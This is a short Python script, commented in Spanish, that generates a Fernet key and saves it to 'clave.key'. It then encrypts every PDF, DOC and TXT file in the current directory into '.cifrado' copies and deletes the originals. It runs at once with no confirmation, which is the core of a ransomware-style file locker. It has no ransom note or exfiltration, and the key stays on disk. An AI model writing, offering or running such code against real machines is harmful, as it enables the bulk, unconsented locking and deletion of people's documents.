from cryptography.fernet import Fernet
import os
import glob

def generar_clave():
    return Fernet.generate_key()

def guardar_clave(clave, nombre_archivo="clave.key"):
    with open(nombre_archivo, "wb") as archivo_clave:
        archivo_clave.write(clave)

def cargar_clave(nombre_archivo="clave.key"):
    return open(nombre_archivo, "rb").read()

def cifrar_archivo(nombre_archivo, clave):
    cipher_suite = Fernet(clave)

    with open(nombre_archivo, "rb") as archivo_original:
        contenido_original = archivo_original.read()
        contenido_cifrado = cipher_suite.encrypt(contenido_original)

    # Guardar el archivo cifrado
    nombre_archivo_cifrado = nombre_archivo + ".cifrado"
    with open(nombre_archivo_cifrado, "wb") as archivo_cifrado:
        archivo_cifrado.write(contenido_cifrado)

    # Eliminar el archivo original
    os.remove(nombre_archivo)

# Generar y guardar la clave
clave = generar_clave()
guardar_clave(clave)

# Obtener todos los archivos PDF, DOC y TXT en el directorio actual
archivos_pdf = glob.glob("*.pdf")
archivos_doc = glob.glob("*.doc")
archivos_txt = glob.glob("*.txt")

# Cifrar todos los archivos PDF
for pdf in archivos_pdf:
    cifrar_archivo(pdf, clave)

# Cifrar todos los archivos DOC
for doc in archivos_doc:
    cifrar_archivo(doc, clave)

# Cifrar todos los archivos TXT
for txt in archivos_txt:
    cifrar_archivo(txt, clave)
